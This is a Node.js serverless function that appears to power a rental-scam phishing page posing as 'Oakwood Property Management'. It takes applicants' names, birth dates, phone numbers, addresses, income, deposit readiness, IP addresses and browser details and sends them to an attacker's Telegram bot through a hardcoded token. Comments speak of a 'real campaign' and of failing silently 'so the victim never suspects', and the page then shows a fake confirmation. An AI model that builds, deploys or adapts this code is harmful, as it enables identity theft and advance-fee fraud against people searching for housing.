const https = require('https');

// ============ YOUR SECRET CODES ============
const BOT_TOKEN = '8599934735:AAGgL4MeTqbUM_gzNsAUcLMwxCnbGSOcn-4';   // from @BotFather
const CHAT_ID   = '8604770803';     // from @userinfobot
// ===========================================

// DEBUG = true shows error details on screen while testing.
// Set to false before the real campaign.
const DEBUG = true;

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(404).send('Not found');
  }

  // Vercel auto-parses the form body into req.body.
  // This fallback covers any case where it arrives as a raw string.
  let fields = {};
  if (req.body && typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
    fields = req.body;
  } else if (typeof req.body === 'string') {
    fields = Object.fromEntries(new URLSearchParams(req.body));
  }

  const get = (k) => (fields[k] !== undefined ? String(fields[k]).trim() : '');

  const data = {
    full_name:      get('full_name'),
    dob:            get('dob'),
    email:          get('email'),
    home_phone:     get('home_phone'),
    cell_phone:     get('cell_phone'),
    address:        get('address'),
    age:            get('age'),
    marital_status: get('marital_status'),
    occupants:      get('occupants'),
    pet:            get('pet'),
    car:            get('car'),
    occupation:     get('occupation'),
    monthly_income: get('monthly_income'),
    smoke_drink:    get('smoke_drink'),
    night_work:     get('night_work'),
    reference:      get('reference'),
    move_in:        get('move_in'),
    stay_length:    get('stay_length'),
    deposit:        get('deposit'),
    ready_today:    get('ready_today'),
    ip:             req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown',
    user_agent:     req.headers['user-agent'] || 'unknown'
  };

  const msg =
    '<b>📋 NEW RENT APPLICATION</b>\n' +
    '──────────────────\n' +
    '👤 Name:        ' + data.full_name + '\n' +
    '📅 DOB:         ' + data.dob + ' (age ' + data.age + ')\n' +
    '📧 Email:       ' + data.email + '\n' +
    '🏠 Address:     ' + data.address + '\n' +
    '☎️ Home:        ' + data.home_phone + '\n' +
    '📱 Cell:        ' + data.cell_phone + '\n' +
    '💍 Marital:     ' + data.marital_status + '\n' +
    '👨‍👩‍👧 Occupants:   ' + data.occupants + '\n' +
    '🐶 Pet:         ' + data.pet + ' | 🚗 Car: ' + data.car + '\n' +
    '💼 Occupation:  ' + data.occupation + '\n' +
    '💰 Income/mo:   $' + data.monthly_income + '\n' +
    '🍺 Smoke/Drink: ' + data.smoke_drink + ' | 🌙 Night: ' + data.night_work + '\n' +
    '📇 Reference:   ' + data.reference + '\n' +
    '📆 Move-in:     ' + data.move_in + ' (' + data.stay_length + ')\n' +
    '💵 Deposit:     $' + data.deposit + ' — today? ' + data.ready_today + '\n' +
    '──────────────────\n' +
    '🕐 ' + data.ip + ' | ' + data.user_agent;

  try {
    await new Promise((resolve, reject) => {
      const body = JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' });
      const req2 = https.request({
        hostname: 'api.telegram.org',
        path: '/bot' + BOT_TOKEN + '/sendMessage',
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body)
        }
      }, (r) => {
        let resp = '';
        r.on('data', (c) => { resp += c; });
        r.on('end', () => {
          if (r.statusCode === 200) {
            resolve();
          } else {
            reject(new Error('Telegram replied HTTP ' + r.statusCode + ': ' + resp));
          }
        });
      });
      req2.on('error', reject);
      req2.write(body);
      req2.end();
    });
  } catch (err) {
    if (DEBUG) {
      return res.status(500).send('Telegram error: ' + err.message);
    }
    // Live mode: fail silently so the victim never suspects
  }

  const safeName  = (data.full_name || 'there').replace(/[<>&"]/g, '');
  const safeEmail = (data.email || '').replace(/[<>&"]/g, '');

  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(
    '<!DOCTYPE html><html><head><meta charset="UTF-8">' +
    '<meta name="viewport" content="width=device-width, initial-scale=1.0">' +
    '<title>Application Received</title></head>' +
    '<body style="font-family:Arial,sans-serif;background:#f0f2f5;text-align:center;padding-top:80px;">' +
    '<div style="background:#fff;max-width:480px;margin:0 auto;padding:40px;border-radius:8px;box-shadow:0 4px 16px rgba(0,0,0,.1);">' +
    '<h2 style="color:#1b3a5c;margin-top:0;">✅ Application Received</h2>' +
    '<p style="color:#666;line-height:1.6;">Thank you, <strong>' + safeName + '</strong>.<br>' +
    'We will contact you at <strong>' + safeEmail + '</strong> within 24–48 hours.</p>' +
    '<p style="color:#999;font-size:13px;">Oakwood Property Management · Equal Housing Opportunity</p>' +
    '</div></body></html>'
  );
};
